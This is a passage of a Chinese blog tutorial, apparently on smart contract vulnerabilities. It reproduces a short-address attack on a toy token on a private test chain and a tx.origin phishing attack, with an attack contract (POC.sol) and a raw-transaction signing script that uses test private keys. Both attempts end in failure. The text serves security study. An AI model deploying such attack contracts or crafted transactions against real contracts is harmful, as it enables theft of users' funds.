+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.11</span>;</span><br><span class="line">contract MyToken&#123;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint)balances;</span><br><span class="line">  event Transfer(address indexed _from,address indexed _to,uint256 _value);</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">MyToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    balances[tx.origin]=<span class="number">10000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sendCoin</span>(<span class="params">address to,uint amount</span>) <span class="title">returns</span>(<span class="params">bool sufficient</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender]&lt;amount) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    balances[msg.sender] -= amount;</span><br><span class="line">    balances[to] += amount;</span><br><span class="line">    Transfer(msg.sender,to,amount);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getBalance</span>(<span class="params">address addr</span>) <span class="title">constant</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[addr];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>选择 details 复制 web3deploy</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588378994573-c701dcbe-7fe2-45a9-999e-2ccc4a53483e.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=946&originWidth=1920&size=157848&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>因为我们用的是 eth.account[0] 账户部署合约，所以要先解锁 personal.unlockAccount(eth.accounts[0],”123456”)<br>可以看到第三个账户最后一位是 00 嗷</p>
+<blockquote>
+<p>0xcb16c1dd763fb39c121d07590a0881bf0439cd42<br>0xe2fa80e6d74b9f63157ecd131eb11f8130d0416d<br>0x681428ff41bd940bcf641abaf532f3fbc0146f00</p>
+</blockquote>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588645372992-d62aedd5-1250-4cfd-95cd-ede2b11b34a6.png#align=left&display=inline&height=238&margin=%5Bobject%20Object%5D&name=image.png&originHeight=498&originWidth=1560&size=739121&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后开启挖矿 miner.start()<br>把之前复制的 web3deploy 复制到控制台，返回了合约地址和交易的 hash 值，说明部署成功了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mytokenContract = web3.eth.contract([</span><br><span class="line">  &#123;</span><br><span class="line">    constant: <span class="literal">false</span>,</span><br><span class="line">    inputs: [</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">"to"</span>, <span class="attr">type</span>: <span class="string">"address"</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">"amount"</span>, <span class="attr">type</span>: <span class="string">"uint256"</span> &#125;,</span><br><span class="line">    ],</span><br><span class="line">    name: <span class="string">"sendCoin"</span>,</span><br><span class="line">    outputs: [&#123; <span class="attr">name</span>: <span class="string">"sufficient"</span>, <span class="attr">type</span>: <span class="string">"bool"</span> &#125;],</span><br><span class="line">    payable: <span class="literal">false</span>,</span><br><span class="line">    type: <span class="string">"function"</span>,</span><br><span class="line">    stateMutability: <span class="string">"nonpayable"</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    constant: <span class="literal">true</span>,</span><br><span class="line">    inputs: [&#123; <span class="attr">name</span>: <span class="string">"addr"</span>, <span class="attr">type</span>: <span class="string">"address"</span> &#125;],</span><br><span class="line">    name: <span class="string">"getBalance"</span>,</span><br><span class="line">    outputs: [&#123; <span class="attr">name</span>: <span class="string">""</span>, <span class="attr">type</span>: <span class="string">"uint256"</span> &#125;],</span><br><span class="line">    payable: <span class="literal">false</span>,</span><br><span class="line">    type: <span class="string">"function"</span>,</span><br><span class="line">    stateMutability: <span class="string">"view"</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    inputs: [],</span><br><span class="line">    payable: <span class="literal">false</span>,</span><br><span class="line">    type: <span class="string">"constructor"</span>,</span><br><span class="line">    stateMutability: <span class="string">"nonpayable"</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    anonymous: <span class="literal">false</span>,</span><br><span class="line">    inputs: [</span><br><span class="line">      &#123; <span class="attr">indexed</span>: <span class="literal">true</span>, <span class="attr">name</span>: <span class="string">"_from"</span>, <span class="attr">type</span>: <span class="string">"address"</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">indexed</span>: <span class="literal">true</span>, <span class="attr">name</span>: <span class="string">"_to"</span>, <span class="attr">type</span>: <span class="string">"address"</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">indexed</span>: <span class="literal">false</span>, <span class="attr">name</span>: <span class="string">"_value"</span>, <span class="attr">type</span>: <span class="string">"uint256"</span> &#125;,</span><br><span class="line">    ],</span><br><span class="line">    name: <span class="string">"Transfer"</span>,</span><br><span class="line">    type: <span class="string">"event"</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">var</span> mytoken = mytokenContract.new(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">from</span>: web3.eth.accounts[<span class="number">0</span>],</span><br><span class="line">    data:</span><br><span class="line">      <span class="string">"0x6060604052341561000c57fe5b5b612710600060003273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b5b6102b9806100646000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806390b98a1114610046578063f8b2cb4f1461009d575bfe5b341561004e57fe5b610083600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506100e7565b604051808215151515815260200191505060405180910390f35b34156100a557fe5b6100d1600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610243565b6040518082815260200191505060405180910390f35b600081600060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610139576000905061023d565b81600060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555081600060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190505b92915050565b6000600060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490505b9190505600a165627a7a72305820140da13b1607e4177f9e0404e33165222e8a6a7b462372ede9923f27f1fe17820029"</span>,</span><br><span class="line">    gas: <span class="string">"4700000"</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">e, contract</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e, contract);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> contract.address !== <span class="string">"undefined"</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(</span><br><span class="line">        <span class="string">"Contract mined! address: "</span> +</span><br><span class="line">          contract.address +</span><br><span class="line">          <span class="string">" transactionHash: "</span> +</span><br><span class="line">          contract.transactionHash</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588379993181-839b50ba-8560-463a-b234-aff36e8167e3.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=896&originWidth=1898&size=1232053&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>mytoken.getBalance(eth.coinbase) 返回 coinbase 账户中的代币余额<br>mytoken.getBalance(eth.accounts[2]) 返回 eth.account[2] 账户的代币余额（初始为 0）<br>eth.defaultAccount=eth.coinbase 设置默认地址为 coinbase，这是使用合约转账的前提<br>personal.unlockAccount(eth.coinbase,”123456”)  解锁<br>mytoken.sendCoin(eth.accounts[1],’100’)  使用 sendCoin 正常转账给 eth.accounts[1] 账户 100 个代币<br>eth.getTransaction(“交易返回的 hash 值”)    查看交易的信息</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588646600930-140704bf-5b1b-4166-a456-253e06494cb5.png#align=left&display=inline&height=341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=867&originWidth=1898&size=1609280&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>我进行了几次交易</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588646718162-ebf7def7-f5ae-4f0e-8fc5-9554c48f266b.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=80&originWidth=905&size=78303&status=done&style=none&width=644" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>看一下正常的跟不正常的交易信息的对比</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588646776245-072f5eca-7c00-4ae3-b8b9-03e49d7a09e7.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1898&size=1764803&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>为什么我的是在前面补齐的？？？</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588646869086-7a796007-ac54-41da-bd5b-2e5b8cab751a.png#align=left&display=inline&height=78&margin=%5Bobject%20Object%5D&name=image.png&originHeight=156&originWidth=1447&size=33541&status=done&style=stroke&width=724" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>看师傅博客，发现果然是不再贴心了</p>
+<p>[<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://blog.csdn.net/TurkeyCock/article/details/84061796" alt="image.png](https://cdn.nlark.com/yuque/0/2020/png/268938/1588404457720-88e90392-c9a9-4687-ba81-52312018e76e.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&name=image.png&originHeight=643&originWidth=1268&size=468700&status=done&style=stroke&width=729)" title="">
+                </div>
+                <div class="image-caption">image.png](https://cdn.nlark.com/yuque/0/2020/png/268938/1588404457720-88e90392-c9a9-4687-ba81-52312018e76e.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&name=image.png&originHeight=643&originWidth=1268&size=468700&status=done&style=stroke&width=729)</div>
+            </figure></p>
+<h3 id="再次尝试"><a href="#再次尝试" class="headerlink" title="再次尝试"></a>再次尝试</h3><p>然而可以参考博客的方法，先 生成 abi 编码，再去掉几个 0 后生成 raw transaction，使用 sendRawTransaction() 发送交易</p>
+<p>记录一下现在的账户余额</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588897744240-3c81ecb7-8d70-44e4-8dda-b7dec1ac9bfd.png#align=left&display=inline&height=73&margin=%5Bobject%20Object%5D&name=image.png&originHeight=106&originWidth=484&size=50202&status=done&style=none&width=333" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>var mytoken = mytokenContract.at(‘0x6001e62c13146912b7b08ea1702f0abb2c94551c’)<br>这个地址是部署合约的时候返回的合约地址</p>
+<p>var abi = mytoken.sendCoin.getData(‘0x681428ff41bd940bcf641abaf532f3fbc0146f00’, 1)<br>目标账户地址（用来攻击的那个后面俩 0 的），先填一个正常的</p>
+<p>得到一串 abi 编码后的东西</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588897787674-48673cea-d4f8-4f86-8e01-7c86438e71cb.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&name=image.png&originHeight=185&originWidth=1560&size=391482&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>0x90b98a11000000000000000000000000681428ff41bd940bcf641abaf532f3fbc0146f000000000000000000000000000000000000000000000000000000000000000001</p>
+<p>另外还需要拿到默认账户的私玥<br>因为我的 npm 死活安不上一个东西，我选择用 metamask 查看。<br>导入你本地那个账户的文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657166028-e0c4896e-7f23-49c1-b849-c0cc64165d8e.png#align=left&display=inline&height=354&margin=%5Bobject%20Object%5D&name=image.png&originHeight=557&originWidth=453&size=37870&status=done&style=stroke&width=288" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这里注意，是你本地那个账号的密码，我的就是之前生成的 123456</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657264285-95806606-5411-4061-8f1e-96c0ccfecf70.png#align=left&display=inline&height=424&margin=%5Bobject%20Object%5D&name=image.png&originHeight=776&originWidth=425&size=52435&status=done&style=stroke&width=232" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>导入的文件就是这个</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657336003-b4585fed-8ce4-4e2e-834c-f1d5baac6717.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&name=image.png&originHeight=191&originWidth=648&size=17982&status=done&style=stroke&width=466" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657562814-05cad950-d184-47d6-9429-a6c5dfbfd258.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=676&originWidth=451&size=41611&status=done&style=stroke&width=196" alt="image.png](https://cdn.nlark.com/yuque/0/2020/png/268938/1588657540145-14d4c80d-3181-4bb5-b411-7742f189f7ed.png#align=left&display=inline&height=235&margin=%5Bobject%20Object%5D&name=image.png&originHeight=445&originWidth=454&size=33802&status=done&style=stroke&width=240)![image.png" title="">
+                </div>
+                <div class="image-caption">image.png](https://cdn.nlark.com/yuque/0/2020/png/268938/1588657540145-14d4c80d-3181-4bb5-b411-7742f189f7ed.png#align=left&display=inline&height=235&margin=%5Bobject%20Object%5D&name=image.png&originHeight=445&originWidth=454&size=33802&status=done&style=stroke&width=240)![image.png</div>
+            </figure>
+
+<p>这里的密码就是你用这个插件设置的密码了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657607628-5c32c4a8-f04f-4764-a4f3-de01ab285607.png#align=left&display=inline&height=324&margin=%5Bobject%20Object%5D&name=image.png&originHeight=647&originWidth=450&size=43876&status=done&style=stroke&width=225" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>我这个账户的私钥：<br>068DCAB10E501D352CA1E0E06984C262A000305EFCB8A250C7D31815239C53CE<br>85CAEAB0E22F4FE69B8797FCFBFA0040CE4006984303B92D32607FD16B43E212<br>再回到命令行中：</p>
+<p>npm 换淘宝源<br><code>npm config set registry http://registry.npm.taobao.org/</code></p>
+<p>安装 web3<br><code>npm install web3@^0.20.0</code></p>
+<p>安装 ethereumjs-tx<br><code>npm install ethereumjs-tx</code></p>
+<p>写一个脚本，来看一下 raw transaction</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">'web3'</span>)</span><br><span class="line"><span class="keyword">const</span> Tx = <span class="built_in">require</span>(<span class="string">'ethereumjs-tx'</span>)</span><br><span class="line"><span class="keyword">const</span> privateKey = Buffer.from(<span class="string">'068DCAB10E501D352CA1E0E06984C262A000305EFCB8A250C7D31815239C53CE'</span>, <span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> txParams = &#123;</span><br><span class="line">  nonce: <span class="string">'0x01'</span>, <span class="comment">//可以通过eth.getTransactionCount(eth.accounts[0])得到</span></span><br><span class="line">  gasPrice: <span class="string">'5'</span>,</span><br><span class="line">  gasLimit: <span class="string">'5000'</span>,</span><br><span class="line">  to: <span class="string">'0x6001e62c13146912b7b08ea1702f0abb2c94551c'</span>,</span><br><span class="line">  value: <span class="string">'0x00'</span>,</span><br><span class="line">  data: <span class="string">'0x90b98a11000000000000000000000000681428ff41bd940bcf641abaf532f3fbc0146f0000000000000000000000000000000000000000000000000000000000000001'</span> <span class="comment">//去掉了两个0</span></span><br><span class="line">  <span class="comment">// EIP 155 chainId - mainnet: 1, ropsten: 3</span></span><br><span class="line">  chainId: <span class="number">111</span> <span class="comment">//我搭建的私网ID是111，根据你自己的配置调整</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tx = <span class="keyword">new</span> Tx(txParams, &#123;<span class="string">'chain'</span>:<span class="string">'ropsten'</span>&#125;)</span><br><span class="line">tx.sign(privateKey)</span><br><span class="line"><span class="keyword">var</span> serializedTx = tx.serialize()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'0x'</span> + serializedTx.toString(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588977793467-3d11140c-ff19-4ceb-b867-bb88489638fb.png#align=left&display=inline&height=42&margin=%5Bobject%20Object%5D&name=image.png&originHeight=87&originWidth=1560&size=200742&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>eth.sendRawTransaction(‘0xf84980808080808026a0f1390017f75851c4c165ff3b23fc63480b5d2cc88891fa7207ee5650192d6c07a02344b59dff3ba659db6c8ee75ce1f1d17a126f879fad8c43592d59802445745b’)<br>又出问题了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588977951913-203f4fc1-62b7-42c9-8ea7-5fe234a53c8d.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=image.png&originHeight=187&originWidth=1560&size=403019&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="漏洞防范-5"><a href="#漏洞防范-5" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><h1 id="tx-origin-漏洞"><a href="#tx-origin-漏洞" class="headerlink" title="tx.origin 漏洞"></a>tx.origin 漏洞</h1><h2 id="漏洞概述-4"><a href="#漏洞概述-4" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>tx.origin  是 solidity 中的一个全局变量，可以用来遍历调用栈，并返回最初发送调用的账户的地址，简单说 tx.origin 是最初那个合约的所有者<br>在智能合约中使用  tx.origin 进行身份验证，会导致合约容易受到类似网络钓鱼攻击</p>
+<h2 id="代码调试-7"><a href="#代码调试-7" class="headerlink" title="代码调试"></a>代码调试</h2><p>举个例子说一下，A 调用 B 的时候，中间人和所有者 都是 A，<br>当 A 调用 C，C 再去调用 B 的时候，中间人是 C，但是所有者却是 A</p>
+<p>Phishable.sol</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.22</span>;</span><br><span class="line">contract Phishable&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">constructor</span> (<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdrawAll</span>(<span class="params">address _recipient</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(tx.origin == owner);</span><br><span class="line">        _recipient.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POC.sol</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.22</span>;</span><br><span class="line">interface Phishable&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">owner</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">address</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">withdrawAll</span>(<span class="params">address _recipient</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">POC</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    Phishable phInstance;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">modifier onlyOwner()&#123;</span><br><span class="line">    <span class="built_in">require</span>(owner == msg.sender);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setInstance</span>(<span class="params">address addr</span>) <span class="title">public</span> <span class="title">onlyOwner</span></span>&#123;</span><br><span class="line">    phInstance = Phishable(addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBalance</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span></span>&#123;</span><br><span class="line">    owner.transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">internal</span></span>&#123;</span><br><span class="line">    address phOwner = phInstance.owner();</span><br><span class="line">    <span class="keyword">if</span>(phOwner == msg.sender)&#123;</span><br><span class="line">        phInstance.withdrawAll(owner);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        owner.transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">    attack();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者诱使原合约的所有者发送以太币到攻击合约的地址，然后来调用攻击合约的函数，从而调用原函数的 withdrawAll() 函数，程序将进入原合约中执行<br>此时 msg.sender 就是攻击合约的地址，tx.origin 就是最初发起交易的合约的地址  require(tx.origin == owner)  条件很容易满足</p>
+<p>默认账户部署 Phishable，第二个账户部署 POC<br>使用默认账户，把交易金额设置为 10 ether，点击  Phishable  合约的  fallback  函数，向合约转账 10  以太币</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588425934454-7157ab96-fca1-4f79-b9e0-95638abe3920.png#align=left&display=inline&height=364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=1920&size=187946&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><strong>复现失败</strong></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-07-16T12:42:33.684Z" itemprop="dateUpdated">2020-07-16 20:42:33</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/04/27/moa35g/&title=《智能合约常见漏洞》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
